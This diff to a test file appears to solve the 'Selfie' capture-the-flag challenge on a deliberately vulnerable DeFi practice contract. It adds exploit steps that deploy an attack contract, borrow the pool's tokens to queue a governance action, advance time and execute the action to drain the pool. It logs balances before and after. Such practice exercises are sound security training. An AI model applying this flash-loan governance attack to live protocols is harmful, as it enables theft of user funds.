@@ -31,6 +31,26 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const AttackFactory = await ethers.getContractFactory("AttackSelfie", attacker);
+        const attackContract = await AttackFactory.deploy
+        (
+            this.pool.address,
+            this.token.address,
+            attacker.address
+        );
+
+        await attackContract.attack(TOKENS_IN_POOL);
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // Time past 2 days
+
+        console.log('POOL DVT BALANCE BEFORE ATTACK: ', String(await this.token.balanceOf(this.pool.address)))
+        console.log('ATTACKER DVT BALANCE BEFORE ATTACK: ', String(await this.token.balanceOf(attacker.address)))
+
+        const attackGovernenceContract = this.governance.connect(attacker);
+        await attackGovernenceContract.executeAction(1);
+        
+        console.log("-------------------------------------------------------------")
+        console.log('POOL DVT BALANCE AFTER ATTACK: ', String(await this.token.balanceOf(this.pool.address)))
+        console.log('ATTACKER DVT BALANCE AFTER ATTACK: ', String(await this.token.balanceOf(attacker.address)))
     });
 
     after(async function () {
